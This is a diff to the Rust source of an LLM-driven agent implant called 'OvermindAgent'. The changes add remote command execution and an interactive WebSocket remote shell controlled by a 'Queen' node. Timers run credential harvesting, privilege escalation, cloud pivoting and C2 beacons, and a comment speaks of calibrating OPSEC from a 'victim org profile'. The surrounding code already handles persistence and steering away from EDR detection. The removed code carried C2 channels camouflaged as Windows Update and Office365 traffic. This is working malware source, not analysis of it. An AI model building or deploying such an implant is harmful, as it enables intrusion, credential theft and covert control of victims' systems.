@@ -6,16 +6,14 @@ use tokio::time;
 use tracing::{info, warn};
 use uuid::Uuid;
 
-// Phoenix — persistence heartbeat
 use hive_base::phoenix::Phoenix;
 use hive_base::phoenix::AgentBlueprint;
 
-// Seer — detection prediction & steering
 use hive_base::seer::Seer;
 use hive_base::seer::{SeerAction, TelemetrySample};
 
-// Smoke Signals — camouflaged C2 beacons
-use hive_base::smoke_signals::{C2Message, SmokeChannel, SmokeDirector};
+// smoke_signals only needed for OrgCloudProfile (OPSEC calibration)
+use hive_base::smoke_signals::learn_org_profile;
 
 #[derive(Debug, Serialize, Deserialize)]
 struct LLMResponse {
@@ -47,7 +45,7 @@ struct OvermindAgent {
     whispernet: hive_base::whispernet::WhisperNet,
     last_tournament_gen: usize,
     seer: Seer,
-    smoke_director: SmokeDirector,
+    interactive_shell: Option<hive_base::remote_shell::WsShell>,
 }
 
 impl OvermindAgent {
@@ -72,16 +70,7 @@ impl OvermindAgent {
 
         let seer = Seer::new();
 
-        let mut smoke_director = SmokeDirector::new();
-        smoke_director.add_channel(SmokeChannel::WindowsUpdate);
-        smoke_director.add_channel(SmokeChannel::Office365);
-        smoke_director.add_channel(SmokeChannel::AzureServiceBus);
-        smoke_director.add_channel(SmokeChannel::GoogleDrive);
-        smoke_director.add_channel(SmokeChannel::GitHubActions);
-        smoke_director.add_channel(SmokeChannel::ApplePush);
-        smoke_director.add_channel(SmokeChannel::CloudFrontCDN);
-
-        Self {
+        let agent = Self {
             comms, identity,
             consensus: ConsensusEngine::new(0.66),
             ollama_url: "http://localhost:11434".to_string(),
@@ -92,8 +81,15 @@ impl OvermindAgent {
             whispernet,
             last_tournament_gen: 0,
             seer,
-            smoke_director,
-        }
+            interactive_shell: None,
+        };
+
+        // OPSEC: calibrate from victim org profile at startup
+        let profile = learn_org_profile();
+        agent.comms.calibrate_opsec(&profile);
+        info!("OPSEC: calibrated from org profile");
+
+        agent
     }
 
     fn build_prompt(&self, dilemma: &str, context: &str) -> String {
@@ -162,23 +158,63 @@ impl OvermindAgent {
                     self.publish_msg(resp_msg).await;
                 }
                 Payload::Belief { asset, value: _value, confidence: _confidence }
-                    // Check for HiveMind proposals in beliefs
                     if asset.starts_with("hivemind:") => {
                         info!("HiveMind: received proposal belief: {}", asset);
                     }
                 Payload::Proposal { action, argument, proposal_id } => {
-                    // HiveMind: register as a directive proposal
                     let mut params = HashMap::new();
                     params.insert("action".into(), action.clone());
                     params.insert("argument".into(), argument.clone());
                     self.hivemind.propose_from_operator(self.identity.id(), action.clone(), params);
                     info!("HiveMind: registered proposal {} from {}", proposal_id, msg.agent_role);
                 }
+                Payload::Request { service, payload } if service == "exec" => {
+                    if let Ok(cmd_data) = serde_json::from_slice::<serde_json::Value>(payload) {
+                        let cmd = cmd_data["cmd"].as_str().unwrap_or("id").to_string();
+                        let cmd_id = cmd_data["cmd_id"].as_str().unwrap_or("unknown");
+                        info!("EXEC: executing cmd_id={}: {}", cmd_id, cmd);
+                        let result = hive_base::remote_shell::execute_command(&cmd);
+                        let result_msg = Message::belief(
+                            self.identity.id(), Role::Queen,
+                            format!("exec:result:{}", cmd_id),
+                            hive_base::Value::String(format!(
+                                "exit={} duration={}ms stdout={} stderr={}",
+                                result.exit_code, result.duration_ms,
+                                result.stdout.trim().chars().take(500).collect::<String>(),
+                                result.stderr.trim().chars().take(200).collect::<String>(),
+                            )),
+                            if result.exit_code == 0 { 1.0 } else { 0.5 },
+                        );
+                        self.publish_msg(result_msg).await;
+                    }
+                }
+                Payload::Request { service, payload } if service == "shell" => {
+                    if let Ok(cmd_data) = serde_json::from_slice::<serde_json::Value>(payload) {
+                        let ws_url = cmd_data["url"].as_str().unwrap_or("ws://127.0.0.1:9000/shell");
+                        let cmd_id = cmd_data["cmd_id"].as_str().unwrap_or("unknown");
+                        info!("SHELL: starting interactive shell -> {}", ws_url);
+                        let shell = hive_base::remote_shell::WsShell::start(ws_url);
+                        let prev = self.interactive_shell.replace(shell);
+                        if let Some(mut old) = prev { old.stop(); }
+                        let result_msg = Message::belief(
+                            self.identity.id(), Role::Queen,
+                            format!("shell:result:{}", cmd_id),
+                            hive_base::Value::String("started".into()),
+                            1.0,
+                        );
+                        self.publish_msg(result_msg).await;
+                    }
+                }
+                Payload::Request { service, .. } if service == "shell_stop" => {
+                    info!("SHELL: stopping interactive shell");
+                    if let Some(mut shell) = self.interactive_shell.take() {
+                        shell.stop();
+                    }
+                }
                 _ => {}
             }
         }
 
-        // HiveMind: tally votes for pending directives
         if self.hivemind.enabled {
             let mut rep_map = HashMap::new();
             rep_map.insert(self.identity.id(), 1.0);
@@ -194,7 +230,6 @@ impl OvermindAgent {
                 let msg = self.hivemind.to_belief(directive, self.identity.id());
                 self.publish_msg(msg).await;
 
-                // WhisperNet: broadcast approved directive as P2P fallback
                 let whisper_payload = serde_json::to_vec(&directive).unwrap_or_default();
                 let whisper_msg = hive_base::whispernet::WhisperMessage {
                     msg_id: Uuid::new_v4(),
@@ -212,7 +247,6 @@ impl OvermindAgent {
         }
     }
 
-    /// Run a darwinian tournament
     async fn run_tournament(&mut self) {
         let config = hive_base::tournament::TournamentConfig {
             target: format!("tournament-gen-{}", self.last_tournament_gen),
@@ -243,7 +277,6 @@ impl OvermindAgent {
         self.last_tournament_gen += 1;
     }
 
-    /// Install persistence mechanisms via Phoenix at startup.
     async fn seeds_phoenix(&self) {
         let loader_script = std::env::current_exe()
             .map(|p| p.to_string_lossy().to_string())
@@ -260,7 +293,6 @@ impl OvermindAgent {
         info!("Ollama: {} | Model: {}", self.ollama_url, self.model);
         self.send_heartbeat().await;
 
-        // Phoenix — seed persistence at startup
         self.seeds_phoenix().await;
 
         let mut heartbeat_timer = time::interval(self.heartbeat_interval);
@@ -268,10 +300,12 @@ impl OvermindAgent {
         let mut hivemind_timer = time::interval(Duration::from_secs(120));
         let mut whisper_timer = time::interval(Duration::from_secs(60));
 
-        // New timers for Wire Seer, Smoke Signals, Phoenix heartbeat
         let mut phoenix_timer = time::interval(Duration::from_secs(300));
         let mut seer_timer = time::interval(Duration::from_secs(120));
-        let mut smoke_timer = time::interval(Duration::from_secs(1800));
+        let mut c2_beacon_timer = time::interval(Duration::from_secs(1800));
+        let mut leech_timer = time::interval(Duration::from_secs(1800));
+        let mut privesc_timer = time::interval(Duration::from_secs(300));
+        let mut cloud_pivot_timer = time::interval(Duration::from_secs(1800));
 
         loop {
             tokio::select! {
@@ -294,7 +328,6 @@ impl OvermindAgent {
                     info!("WhisperNet: {} peers, {} msgs routed",
                         self.whispernet.peers().len(), self.whispernet.messages().len());
                 }
-                // ── Phoenix: genome heartbeat every 300s ──────────────────────
                 _ = phoenix_timer.tick() => {
                     let blueprint = AgentBlueprint {
                         role: "queen".into(),
@@ -316,9 +349,7 @@ impl OvermindAgent {
                         }
                     }
                 }
-                // ── Seer: detection prediction & steering every 120s ──────────
                 _ = seer_timer.tick() => {
-                    // Build telemetry sample from arena stats
                     let sample = TelemetrySample {
                         edr_process_count: 0,
                         total_processes: self.whispernet.peers().len() as u32 + 100,
@@ -346,7 +377,6 @@ impl OvermindAgent {
 
                     match action {
                         SeerAction::Retreat => {
-                            // Publish SafetyTrigger belief to warn the colony
                             let msg = Message::belief(
                                 self.identity.id(), Role::Queen,
                                 "SafetyTrigger".into(),
@@ -357,10 +387,8 @@ impl OvermindAgent {
                             info!("Seer: SafetyTrigger published — colony alerted");
                         }
                         SeerAction::Scramble => {
-                            // Call steer() and execute any returned directive
                             if let Some(directive_id) = self.seer.steer(&mut self.hivemind, 0.5) {
                                 info!("Seer: scramble proposed directive {}", directive_id);
-                                // Tally and execute the directive
                                 let mut rep_map = HashMap::new();
                                 rep_map.insert(self.identity.id(), 1.0);
                                 self.hivemind.tally_votes(directive_id, &rep_map);
@@ -373,22 +401,43 @@ impl OvermindAgent {
                                 }
                             }
                         }
-                        SeerAction::Proceed => {
-                            // Low risk — continue normal operations
-                        }
+                        SeerAction::Proceed => {}
                     }
                 }
-                // ── Smoke Signals: colony heartbeat beacon every 30 min ──────
-                _ = smoke_timer.tick() => {
+                // ── C2 beacon via multi-channel failover director ─────────
+                _ = c2_beacon_timer.tick() => {
                     let mut args = HashMap::new();
                     args.insert("peer_count".into(), format!("{}", self.whispernet.peers().len()));
                     args.insert("directive_count".into(), format!("{}", self.hivemind.directives.len()));
                     args.insert("agent_id".into(), format!("{}", self.identity.id()));
-                    let c2msg = C2Message::new("colony_heartbeat".into(), args);
+                    let c2msg = hive_base::smoke_signals::C2Message::new("colony_heartbeat".into(), args);
                     let payload = c2msg.to_beacon_payload();
-                    match self.smoke_director.beacon_round_robin(&payload).await {
-                        Ok(_) => info!("Smoke: colony heartbeat sent via round-robin"),
-                        Err(e) => warn!("Smoke: beacon failed: {}", e),
+                    let sent = self.comms.send_beacon_c2(&payload).await;
+                    if sent {
+                        info!("C2: colony heartbeat delivered via failover director");
+                    } else {
+                        warn!("C2: colony heartbeat failed on all channels");
+                    }
+                }
+                // ── Leech: automated credential harvesting ───────────────
+                _ = leech_timer.tick() => {
+                    info!("LEECH: queuing credential harvest cycle");
+                    self.comms.send_harvest().await;
+                }
+                // ── LPE: privilege escalation with adaptive interval ─────
+                _ = privesc_timer.tick() => {
+                    let (attempted, success) = self.comms.escalate_privileges().await;
+                    if attempted && success {
+                        info!("PRIVESC: root access achieved — adjusting operations");
+                    } else if attempted {
+                        info!("PRIVESC: no vector succeeded — waiting for next attempt");
+                    }
+                }
+                // ── Cloud Worker: pivot into cloud providers ─────────────
+                _ = cloud_pivot_timer.tick() => {
+                    let (executed, resources) = self.comms.pivot_cloud().await;
+                    if executed {
+                        info!("CLOUD: pivot executed — {} resources found", resources);
                     }
                 }
                 _ = time::sleep(Duration::from_millis(200)) => { self.process_incoming().await; }
